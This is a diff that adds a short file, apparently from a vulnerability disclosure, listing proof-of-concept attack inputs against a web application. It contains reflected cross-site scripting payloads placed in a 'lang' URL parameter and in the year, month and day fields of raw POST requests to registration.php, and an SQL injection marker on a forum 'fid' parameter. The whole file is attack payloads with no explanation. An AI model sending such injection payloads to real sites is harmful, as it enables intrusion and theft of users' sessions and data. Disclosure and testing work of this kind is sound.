@@ -1,0 +1,17 @@
+http://www.example.com/documentation/index_list.php?lang=&quot;&gt;&lt;script&gt;alert(/EllipsisSecurityTest/)&lt;/script&gt;
+POST http://www.example.com:80/registration.php?register=Register HTTP/1.0
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Host: www.example.com
+ml=1&amp;year=&quot;&gt;&lt;script&gt;alert(/EllipsisSecurityTest/)&lt;/script&gt;
+POST http://www.example.com:80/registration.php?register=Register HTTP/1.0
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Host: www.example.com
+ml=1&amp;month=&quot;&gt;&lt;script&gt;alert(/EllipsisSecurityTest/)&lt;/script&gt;
+POST http://www.example.com:80/registration.php?register=Register HTTP/1.0
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Host: www.example.com
+ml=1&amp;day=&quot;&gt;&lt;script&gt;alert(/EllipsisSecurityTest/)&lt;/script&gt;
+http://www.example.com/forum/index.php?fid=-1[SQL]
